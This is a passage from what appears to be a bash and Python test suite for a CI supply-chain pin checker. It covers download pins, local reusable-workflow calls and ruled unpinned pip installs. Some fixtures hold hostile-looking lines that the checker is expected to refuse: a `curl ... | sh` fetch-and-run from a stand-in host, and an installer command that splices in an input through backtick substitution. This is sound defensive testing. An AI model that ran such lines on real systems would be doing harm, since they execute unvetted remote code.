    want = {(TOOLS[t], "v" + vers[t], "%s_%s_linux_%s.tar.gz" % (t, vers[t], a)) for t in TOOLS for a in ARCHES}
    got = set()
    for it in inv.inventory(f).values():
        repo = age.TOOL_REPOS.get(it.name) or (it.name if re.fullmatch(r"[\w.-]+/[\w.-]+", it.name) else None)
        if it.kind != "tool" or not repo or not age.is_pin(it.version) or re.search(r"\$\{|\(variable\)|\(expression\)|\(unmeasured", it.name) or "#" not in it.path:
            die("not a measurable pin with its checksum bound: " + it.key)
        got.add((it.name, it.version, it.path.split("#")[0]))
    if got != want:
        die("measured %s, wanted %s" % (sorted(got), sorted(want)))
    print("measured: " + ", ".join(sorted("%s@%s %s" % g for g in got)))
def mutate(src, out, kind):
    lines = open(src).read().split("\n")
    def edit(label, rx, rep):
        for i, ln in enumerate(lines):
            if re.match(r"^\s*%s\)" % re.escape(label), ln):
                new, k = re.subn(rx, rep, ln, count=1)
                if k == 1:
                    lines[i] = new; return
        print("mutant %s did not apply" % kind); sys.exit(3)
    if kind == "variable":
        edit("melange-amd64", r"/download/v[^/]+/", "/download/v$ver/")
    elif kind == "repovar":
        edit("apko-amd64", re.escape(HOST) + r"[\w.-]+/[\w.-]+/", lambda m: HOST + "$repo/")
    elif kind == "mismatch":
        edit("apko-arm64", r"/download/v(\d+)\.(\d+)\.(\d+)/apko_\d+\.\d+\.\d+_", lambda m: "/download/v{0}.{1}.{2}/apko_{0}.{1}.{2}_".format(m.group(1), m.group(2), int(m.group(3)) + 1))
    else:
        print("unknown mutant " + kind); sys.exit(2)
    open(out, "w").write("\n".join(lines))
{"inventory": lambda: inventory(sys.argv[3]), "mutate": lambda: mutate(sys.argv[3], sys.argv[4], sys.argv[5])}[sys.argv[2]]()
PY
ibt() { python3 "$work/ibt-inv.py" "$here/../supply-chain" "$@" </dev/null >"$work/ibt.out" 2>&1; }
# ibt_refused KIND REGEX [RUNNER]: the inventory command is ibt unless a harness case names a stub as the third argument (never read from the environment)
ibt_refused() { local kind=$1 kw=$2 run=ibt; [ $# -lt 3 ] || run=$3; ibt mutate "$root/bin/install-build-tools.sh" "$work/ibt-$kind.sh" "$kind" || return 1; local rc=0; "$run" inventory "$work/ibt-$kind.sh" || rc=$?
  [ "$rc" -ne 0 ] && [ "$rc" -ne 126 ] && [ "$rc" -ne 127 ] && grep -Eq -- "$kw" "$work/ibt.out"; }   # 126/127: the inventory could not RUN, which is not a refusal
CASE="REQ-SUP-001-AC18: the real inventory measures install-build-tools.sh as 4 pins (melange and apko x amd64 and arm64, owner/repo@vX.Y.Z, checksum bound), nothing unmeasured"
check ibt inventory "$root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18: a variable version in the release address is read as a placeholder, not a pin (pin-age refuses it)"
check ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18: a variable repository in the release address is unmeasured (pin-age refuses it)"
check ibt_refused repovar 'unmeasured: a download'
CASE="REQ-SUP-001-AC18: a URL version that differs from the pinned set is measured as a version outside it"
check ibt_refused mismatch 'wanted'
# the harness itself: a failure to RUN the inventory (exit 126 not executable, 127 not found) is not a refusal, even when the output names the diagnostic
ibt_stub_rc=1 ibt_stub_msg=""
ibt_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; printf '%s' "$ibt_stub_msg" >"$work/ibt.out"; return "$ibt_stub_rc"; }
# stub_refused RC [OUTPUT]: the stub exits RC after printing OUTPUT (default: the expected diagnostic)
stub_refused() { ibt_stub_rc=$1; ibt_stub_msg=${2-install-build-tools: unmeasured: a download}; ibt_refused repovar 'unmeasured: a download' ibt_stub; }
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with the diagnostic counts as a refusal (the stub stands in correctly)"
check stub_refused 1
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be found (exit 127) is not a refusal, even with the diagnostic"
check eval '! stub_refused 127'
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be executed (exit 126) is not a refusal, even with the diagnostic"
check eval '! stub_refused 126'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with a WRONG diagnostic is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 "install-build-tools: measured something else"'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with EMPTY output is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 ""'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 0 WITH the diagnostic is not a refusal (the nonzero status is pinned)"
check eval '! stub_refused 0'
# the inventory command is never read from the environment: with IBT_RUN exported as a stub that always prints a diagnostic and exits 1,
# the real cases still run the real inventory (the stub's diagnostic never satisfies them, the real one does)
ibt_env_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; echo "install-build-tools: unmeasured: a download" >"$work/ibt.out"; return 1; }
# iso W H R CMD...: run CMD in a child bash with IBT_RUN exported as the stub; the paths and the command reach the child as ARGUMENTS, never spliced into its script
iso() { IBT_RUN=ibt_env_stub bash -c "$(declare -f ibt ibt_refused ibt_env_stub)"'
work=$1 here=$2 root=$3; shift 3; "$@"' iso-child "$@"; }
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the variable-version mutant still fails on the REAL diagnostic (not a measurable pin)"
check iso "$work" "$here" "$root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the stub's diagnostic is not what the variable-version mutant yields"
check iso "$work" "$here" "$root" eval '! ibt_refused variable "unmeasured: a download"'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the real positive case still passes"
check iso "$work" "$here" "$root" ibt inventory "$root/bin/install-build-tools.sh"
q="$work/it's a dir"; mkdir -p "$q/agent/tests" "$q/root/bin"; cp -R "$here/../supply-chain" "$q/agent/supply-chain"; cp "$root/bin/install-build-tools.sh" "$q/root/bin/"; cp "$work/ibt-inv.py" "$q/"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the real positive case still passes"
check iso "$q" "$q/agent/tests" "$q/root" ibt inventory "$q/root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the variable-version mutant still fails on the REAL diagnostic"
check iso "$q" "$q/agent/tests" "$q/root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'

# --- REQ-SUP-001-AC19: a local reusable-workflow call (advisor, Oct 14; ops/docs/ratify/2026-10-13-advisor-latitude-costs-and-stale-wording.md, question 2) ---
# The exact form `uses: ./.github/workflows/<name>.yml`, with that file in the tree and read as a workflow, is no item: the called file is inventoried
# itself. Any other local form stays an item that cannot pass. A `with:` that passes a version-shaped value keeps the call an item (the callee may feed
# it to an installer, and nothing in the callee's file would move): refused as before.
cat >"$work/callee.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
EOF
# lcall NAME USES [WITH-BLOCK]: a copy of base whose head adds .github/workflows/callee.yml and a job `c` in ci.yml calling USES (the pieces travel in files)
lcall() {
  local n=$1 uses=$2 with=${3:-}
  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
uses = pathlib.Path(r'$work/lcall.uses').read_text()
with_ = pathlib.Path(r'$work/lcall.with').read_text()
c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
}
lck() { runck "$1"; }
lcall l1 './.github/workflows/callee.yml'
lck l1
CASE="AC19: a call of ./.github/workflows/<name>.yml whose file is in the tree is no item: exit 0 and nothing moved"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/l1.out"
lcall l2 './.github/workflows/callee.yml' $'    with:\n      mode: release\n      digests: ${{ needs.j.outputs.digests }}\n'
lck l2
CASE="AC19: ANY with: value keeps the call an item, plain words and expressions included (the closed form: exit 1)"
check test "$rc" -eq 1
lcall l3 './.github/workflows/callee.yml' $'    with:\n      tool-version: 9.9.9\n'
lck l3
CASE="AC19: a with: value that is a version (9.9.9) keeps the call an item that cannot pass: exit 1, the local call is named"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/l3.out"
lcall l4 './.github/workflows/callee.yml' $'    with:\n      tool-version: ${{ inputs.v || \'9.9.9\' }}\n'
lck l4
CASE="AC19: an expression that holds a version literal inside it keeps the call an item (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/l4.out"
lcall l5 './.github/workflows/callee.yml' $'    with:\n      pin: v2.17.1\n'
lck l5
CASE="AC19: a v-prefixed version value keeps the call an item (exit 1)"
check test "$rc" -eq 1
lcall l6 './.github/workflows/callee.yml' $'    with:\n      digest: sha256:'"$(printf '7%.0s' $(seq 64))"$'\n'
lck l6
CASE="AC19: a digest value keeps the call an item (exit 1)"
check test "$rc" -eq 1
i=0
for form in './other/callee.yml' './.github/workflows/sub/callee.yml' './.github/workflows/../callee.yml' './.github/workflows/callee.yml@main' './.github/workflows/missing.yml' './.github/workflows/callee.txt' './.github/actions/local'; do
  i=$((i+1)); lcall "lx$i" "$form"; lck "lx$i"
  CASE="AC19: the form '$form' is not the exact local workflow call: it is not exempted (exit 1)"
  check test "$rc" -eq 1
done
newcase lmoved "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text().replace('$SHA1', '$NEW1'))
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/callee.yml\n')"
runck lmoved
CASE="AC19: the called file is inventoried by its own rules: a pin moved inside it is still NAMED (and read) though the call itself is no item"
check test "$rc" -eq 0; check grep -q "action:actions/checkout@$NEW1" "$work/lmoved.out"

# --- REQ-SUP-001-AC20: a ruled row for an unpinned package named by a script line (advisor Oct 14: option B; the AC16 mechanism, no parser) ---
# A script line whose pip install names a package with no version is an item that cannot pass. The base branch's exceptions file may rule that line exactly like
# AC16's text lines: {file, form "an unpinned package install", key = line = 64-hex hash of the whole flattened line, ruling[, count]}. Only a script (*.sh)
# outside .github/agent/ can be ruled; the same text in a workflow step, or in a script under .github/agent/, fails as before.
pk_line="       'run: |\\n          bash bin/witnessed.sh apk bin/build-stage-apk.sh\\n          pip install requests'"
pyk() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }
# pkrows OUT MODE FILE LINE: the exceptions file, hashes computed here, independent of the check
pkrows() {
  python3 - "$1" "$2" "$3" "$4" <<'PY'
import hashlib, json, sys
out, mode, f, line = sys.argv[1:5]
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
h = H(" ".join(line.split()))
row = {"file": f, "form": "an unpinned package install", "key": h, "line": h,
       "ruling": "test fixture: the quoted text is input to a judge test and is never executed; advisor ruling Oct 13"}
rows = [row]
if mode == "none": rows = []
elif mode == "wronghash": row["key"] = row["line"] = ("0" if h[0] != "0" else "1") + h[1:]
elif mode == "wrongfile": row["file"] = "bin/other-test.sh"
elif mode == "wrongform": row["form"] = "a download"
elif mode == "count2": row["count"] = 2
elif mode == "ok": pass
else: raise SystemExit("unknown mode " + mode)
json.dump({"_format": "t", "exceptions": [], "unmeasured_text": rows}, open(out, "w"), indent=2)
PY
}
pkck() { # REPO MODE FILE LINE -> rc, $work/pk.out
  local repo=$1 mode=$2 f=$3 line=$4; pkrows "$work/pk-$repo-$mode.json" "$mode" "$f" "$line"; rc=0
  python3 "$chk" --root "$work/$repo" --base HEAD~1 --head HEAD --json "$work/pk.json" --exceptions "$work/pk-$repo-$mode.json" >"$work/pk.out" 2>&1 || rc=$?
}
newcase pk "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$pk_line
")"
pkck pk none bin/judge-test.sh "$pk_line"
CASE="AC20: with no row, the added script line that names an unpinned package fails (exit 1): a pull request that adds one is refused"
check test "$rc" -eq 1
pkck pk ok bin/judge-test.sh "$pk_line"
CASE="AC20: a base-branch row (file, form, key and line hash, ruling) for that exact line passes: exit 0, reported as ruled text with the ruling"
check test "$rc" -eq 0; check grep -q 'ruled text' "$work/pk.out"; check grep -q 'is never executed' "$work/pk.out"
pkck pk wronghash bin/judge-test.sh "$pk_line"
CASE="AC20: a row whose hash is off by one digit does not apply (exit 1)"
check test "$rc" -eq 1
pkck pk wrongfile bin/judge-test.sh "$pk_line"
CASE="AC20: a row for another file does not apply (exit 1)"
check test "$rc" -eq 1
pkck pk wrongform bin/judge-test.sh "$pk_line"
CASE="AC20: a row with another form does not apply (exit 1)"
check test "$rc" -eq 1
newcase pkedit "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
${pk_line/requests/requests2}
")"
pkrows "$work/pk-orig.json" ok bin/judge-test.sh "$pk_line"
rc=0; python3 "$chk" --root "$work/pkedit" --base HEAD~1 --head HEAD --exceptions "$work/pk-orig.json" >"$work/pk.out" 2>&1 || rc=$?
CASE="AC20: editing the ruled line voids its row (the whole-line hash changes): exit 1"
check test "$rc" -eq 1
newcase pktwo "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$pk_line
$pk_line
")"
pkck pktwo ok bin/judge-test.sh "$pk_line"
CASE="AC20: two copies of a line ruled with count 1 fail (exit 1): the row names one occurrence"
check test "$rc" -eq 1
pkck pktwo count2 bin/judge-test.sh "$pk_line"
CASE="AC20: the same two copies ruled with count 2 pass (exit 0)"
check test "$rc" -eq 0
newcase pkwf "
import pathlib
c = pathlib.Path('.github/workflows/ci.yml')
c.write_text(c.read_text() + '      - run: pip install requests\n')"
pkck pkwf ok .github/workflows/ci.yml "      - run: pip install requests"
CASE="AC20: the same package text in a WORKFLOW step cannot be ruled (a row for the workflow file does not apply): exit 1"
check test "$rc" -eq 1
newcase pkpinned "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
pip install fixture-pkg==3.1.4 --hash=sha256:aaaa
")"
rc=0; python3 "$chk" --root "$work/pkpinned" --base HEAD~1 --head HEAD >"$work/pk.out" 2>&1 || rc=$?
CASE="AC20: a pinned package line is not an unpinned-package occurrence: no row is asked for (the pin itself is named as before and read: exit 0)"
check test "$rc" -eq 0; check grep -q 'pypi/fixture-pkg@3.1.4' "$work/pk.out"; check bash -c "! grep -qi 'unmeasured' '$work/pk.out'"
newcase pkff "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$(printf 'pip install requests\f')
")"
pkck pkff ok bin/judge-test.sh "pip install requests"
CASE="AC20: a line holding whitespace other than space or tab (a form feed) can never be ruled: exit 1"
check test "$rc" -eq 1

# --- round 1 of the review of PR 329 (both seats held): the exact boundary of AC19, the line identity of AC20 ------------------
# lcallc NAME USES [WITH] [CALLEE-TEXT-FILE]: like lcall, with the callee's text taken from a file; and as a STEP rather than a job when NAME starts with step
lcallc() {
  local n=$1 uses=$2 with=${3:-} callee=${4:-$work/callee.yml}
  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$callee').read_text())
c = w / 'ci.yml'
uses = pathlib.Path(r'$work/lcall.uses').read_text()
with_ = pathlib.Path(r'$work/lcall.with').read_text()
c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
}
lcallc m1 './.github/workflows/callee.yaml'
lck m1
CASE="AC19: the .yaml spelling is not the exact form: not exempted (exit 1)"
check test "$rc" -eq 1
lcallc m2 './.github/workflows/ca..llee.yml'
lck m2
CASE="AC19: a name holding .. is not the plain form: not exempted (exit 1)"
check test "$rc" -eq 1
newcase mstep "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text().replace('    steps:\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', '    steps:\n      - uses: ./.github/workflows/callee.yml\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', 1))"
lck mstep
CASE="AC19: a STEP that uses a workflow file is not a reusable-workflow call: it stays an item (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/mstep.out"
lcallc m3 ' ./.github/workflows/callee.yml'
printf '%s' "\" ./.github/workflows/callee.yml\"" >"$work/lcall.uses"
newcase m3 "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: \" ./.github/workflows/callee.yml\"\n')"
lck m3
CASE="AC19: a quoted value with a leading space is not the exact form: not exempted (exit 1)"
check test "$rc" -eq 1
printf '%s\n' 'on: workflow_call' >"$work/callee-empty.yml"
lcallc m4 './.github/workflows/callee.yml' '' "$work/callee-empty.yml"
lck m4
CASE="AC19: a callee with no jobs is not a workflow read as one: not exempted (exit 1)"
check test "$rc" -eq 1
printf '%s\n' 'echo harmless' >"$work/callee-scalar.yml"
lcallc m5 './.github/workflows/callee.yml' '' "$work/callee-scalar.yml"
lck m5
CASE="AC19: a callee that is a plain scalar is not a workflow: not exempted (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-notcall.yml" <<EOF
on: push
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
EOF
lcallc m6 './.github/workflows/callee.yml' '' "$work/callee-notcall.yml"
lck m6
CASE="AC19: a callee with no workflow_call trigger cannot be called: not exempted (exit 1)"
check test "$rc" -eq 1
lcallc m7 './.github/workflows/callee.yml' $'    with:\n      mode2: release\n'
lck m7
CASE="AC19: any with: value, whatever it holds, keeps the call an item (exit 1)"
check test "$rc" -eq 1
lcallc m8 './.github/workflows/callee.yml' $'    with:\n      mode: café\n'
lck m8
CASE="AC19: a non-ASCII with: value keeps the call an item (exit 1)"
check test "$rc" -eq 1
lcallc m9 './.github/workflows/callee.yml' $'    with:\n      steps: [one, \'two2\']\n'
lck m9
CASE="AC19: a digit inside a list value keeps the call an item (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-fed.yml" <<EOF
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
        with:
          version: \${{ inputs.version }}
EOF
lcallc m10 './.github/workflows/callee.yml' $'    with:\n      version: latest\n' "$work/callee-fed.yml"
lck m10
CASE="AC19: a callee whose installer version comes from an input (an expression in its identity) is not exempted, whatever the caller passes (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-dl.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://example.invalid/tool.sh | sh
EOF
lcallc m11 './.github/workflows/callee.yml' '' "$work/callee-dl.yml"
lck m11
CASE="AC19: a callee with a download this check cannot measure: the call is no item, the callee's own new download fails by its own rule (exit 1)"
check test "$rc" -eq 1
# a call whose with: input changes between base and head, in the quoted-space spelling (the input's identity must move with it)
rm -rf "$work/mchg"; cp -R "$base" "$work/mchg"
( cd "$work/mchg" && python3 - "$work/callee.yml" <<'PY'
import pathlib, subprocess, sys
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(sys.argv[1]).read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: " ./.github/workflows/callee.yml"\n    with:\n      pin: v1.0.0\n')
subprocess.run(["git", "add", "-A"], check=True)
subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "base2"], check=True)
c.write_text(c.read_text().replace("v1.0.0", "v9.9.9"))
subprocess.run(["git", "add", "-A"], check=True)
subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "head2"], check=True)
PY
)
lck mchg
CASE="AC19: changing a version input of a local call (quoted with a leading space) moves the call's identity: exit 1, not 0"
check test "$rc" -eq 1; check grep -q 'action:local:' "$work/mchg.out"

# AC20: the line identity
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/mix-base.sh"
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' '# pip install fixture' >"$work/mix-head.sh"
rm -rf "$work/mix"; cp -R "$base" "$work/mix"
( cd "$work/mix" && cp "$work/mix-base.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b2 && cp "$work/mix-head.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h2 )
pkck mix ok bin/mix-test.sh "# pip install fixture"
CASE="AC20: a ruled comment line does not rule the UNCHANGED install line whose assignment changed: exit 1"
check test "$rc" -eq 1
newcase pkscan "
import pathlib
f = pathlib.Path('bin/install-scanner.sh')
f.write_text(f.read_text() + 'echo \"fixture pip install requests\"\n')"
pkck pkscan ok bin/install-scanner.sh 'echo "fixture pip install requests"'
CASE="AC20: the same ruled line in bin/install-scanner.sh passes like in any script (exit 0)"
check test "$rc" -eq 0
pkck pkscan none bin/install-scanner.sh 'echo "fixture pip install requests"'
CASE="AC20: without its row the line in bin/install-scanner.sh fails (exit 1)"
check test "$rc" -eq 1
# the advisory audit judges the same line once: with a row it is not an advisory hit, without it it is (exit 1)
audfx() {  # REPO OUT: a fixtures file with an advisory against the repo's unpinned requests item
  python3 - "$work/$1" "$2" "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[3]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
k = [k for k in inv.load_at(sys.argv[1], None) if k.startswith("package:pypi/requests@(unpinned)")]
assert len(k) == 1, k
json.dump({"lists": {k[0]: {"github": [{"id": "GHSA-test-test-test", "incident": "INC-T", "affected": True, "modified": "2026-09-01T00:00:00Z"}], "osv": []}},
           "upstream": {}, "prs": []}, open(sys.argv[2], "w"))
PY
}
audck() {  # REPO EXCEPTIONS -> rc
  rc=0; python3 "$here/../supply-chain/pin-audit.py" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/aud.fx.json" --exceptions "$2" --now "$NOW" --gh /bin/true >"$work/aud.out" 2>&1 || rc=$?
}
audfx pk "$work/aud.fx.json"
audck pk "$work/pk-pk-ok.json"
CASE="AC20: pin-audit (the second command of the required job) does not report a ruled script line's package as an advisory hit (exit 0)"
check test "$rc" -eq 0
audck pk "$work/pk-pk-none.json"
CASE="AC20: with no row the same package IS an advisory hit in pin-audit (exit 1): the ruling is what changes it"
check test "$rc" -eq 1; check grep -q 'HIT' "$work/aud.out"
# --- round 2 of the review of PR 329: state between calls, a relay, a self-call, an identical copy, a fractional clock -------------------------------------
cat >"$work/callee2.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@$SHA5 # v4.2.0
EOF
newcase two "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
(w / 'callee2.yml').write_text(pathlib.Path(r'$work/callee2.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n  c2:\n    uses: ./.github/workflows/callee2.yml\n')"
lck two
CASE="AC19: two different plain callees in one tree are BOTH exempted: no state of the first judgement leaks into the second (exit 0)"
check test "$rc" -eq 0; check bash -c "! grep -q 'action:local:' '$work/two.out'"
# the second call already in the base, the first added in the head: the unchanged second must not move
rm -rf "$work/two2"; cp -R "$base" "$work/two2"
( cd "$work/two2" && python3 - "$work" <<'PY'
import pathlib, subprocess, sys
work = sys.argv[1]
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(work + '/callee.yml').read_text())
(w / 'callee2.yml').write_text(pathlib.Path(work + '/callee2.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c2:\n    uses: ./.github/workflows/callee2.yml\n')
g = lambda *a: subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True)
g("add", "-A"); g("commit", "-qm", "b")
c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n')
g("add", "-A"); g("commit", "-qm", "h")
PY
)
lck two2
CASE="AC19: adding one exempt call beside an unchanged one moves nothing (exit 0): the unchanged call keeps its exemption"
check test "$rc" -eq 0
# a relay: caller -> relay -> leaf, the relay forwarding an input to an installer version in the leaf
cat >"$work/leaf.yml" <<EOF
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  i:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version: \${{ inputs.version }}
EOF
cat >"$work/relay.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  forward:
    uses: ./.github/workflows/leaf.yml
    with:
      version: ${{ inputs.version }}
EOF
newcase relay "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'leaf.yml').write_text(pathlib.Path(r'$work/leaf.yml').read_text())
(w / 'relay.yml').write_text(pathlib.Path(r'$work/relay.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/relay.yml\n    with:\n      version: latest\n')"
lck relay
CASE="AC19: a relay that forwards an input to another local workflow is not exempted (a version could be steered through it): the call stays an item (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:./.github/workflows/relay.yml' "$work/relay.out"
printf 'on: workflow_call\njobs:\n  j:\n    uses: ./.github/workflows/selfcall.yml\n' >"$work/selfcall.yml"
newcase selfc "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'selfcall.yml').write_text(pathlib.Path(r'$work/selfcall.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/selfcall.yml\n')"
lck selfc
CASE="AC19: a workflow that calls itself terminates (no crash); with no with: the call is no item and nothing else moved (exit 0)"
check test "$rc" -eq 0; check bash -c "! grep -qi 'traceback\|recursion' '$work/selfc.out'"
# AC20: an identical copy added beside an unchanged install line whose assignment changed
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/cp-base.sh"
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' 'pip install "$DEPS"' >"$work/cp-head.sh"
rm -rf "$work/cp"; cp -R "$base" "$work/cp"
( cd "$work/cp" && cp "$work/cp-base.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b3 && cp "$work/cp-head.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h3 )
pkrows "$work/pk-cp.json" count2 bin/cp-test.sh 'pip install "$DEPS"'
rc=0; python3 "$chk" --root "$work/cp" --base HEAD~1 --head HEAD --exceptions "$work/pk-cp.json" >"$work/cp.out" 2>&1 || rc=$?
CASE="AC20: an identical copy of a line the base already holds is never ruled away with the unchanged one whose assignment moved (exit 1)"
check test "$rc" -eq 1
audfx cp "$work/aud-cp.fx.json" 2>/dev/null || true
# the opaque installer input: a version selected by a FILE the caller names (round 3 of the review of PR 329)
cat >"$work/callee-file.yml" <<EOF
on:
  workflow_call:
    inputs:
      file:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version-file: \${{ inputs.file }}
EOF
lcallc m12 './.github/workflows/callee.yml' $'    with:\n      file: stable.txt\n' "$work/callee-file.yml"
lck m12
CASE="AC19: a callee that hands a caller input to an installer through an input nobody classified (python-version-file) is not exempted (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:./.github/workflows/callee.yml' "$work/m12.out"

# round 4 of the review: an input may appear in a callee only in an if:, a name:, or an env: value handed to a script as a quoted argument
cat >"$work/callee-uses.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      version:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${{ inputs.version }}
EOF
lcallc m14 './.github/workflows/callee.yml' $'    with:\n      version: stable\n' "$work/callee-uses.yml"
lck m14
CASE="AC19: an input in a remote uses: reference (which the inventory cannot read) keeps the call an item whatever the caller passes (exit 1)"
check test "$rc" -eq 1; check grep -q 'action:local:./.github/workflows/callee.yml' "$work/m14.out"
cat >"$work/callee-goenv.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      suffix:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - env:
          TOOL_SUFFIX: ${{ inputs.suffix }}
        run: go install github.com/example/tool@v1.0.0`printenv TOOL_SUFFIX`
EOF
lcallc m15 './.github/workflows/callee.yml' $'    with:\n      suffix: -alpha\n' "$work/callee-goenv.yml"
lck m15
CASE="AC19: an input handed through env to an installer command in the same step keeps the call an item (exit 1)"
check test "$rc" -eq 1
cat >"$work/callee-envarg.yml" <<'EOF'
on:
  workflow_call:
    inputs:
      mode:
        type: string
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - name: the mode is release or snapshot
        if: ${{ inputs.mode == 'release' }}
        env:
          MODE: ${{ inputs.mode }}
        run: bash bin/refuse-mode.sh "$MODE"
EOF
lcallc m16 './.github/workflows/callee.yml' $'    with:\n      mode: release\n' "$work/callee-envarg.yml"
lck m16
CASE="AC19: even the quiet shape (an if: and a quoted env argument) keeps the call an item once the caller passes a with: value (exit 1)"
check test "$rc" -eq 1

# round 5 of the review: the step that receives an input through env must be nothing but a literal script invocation
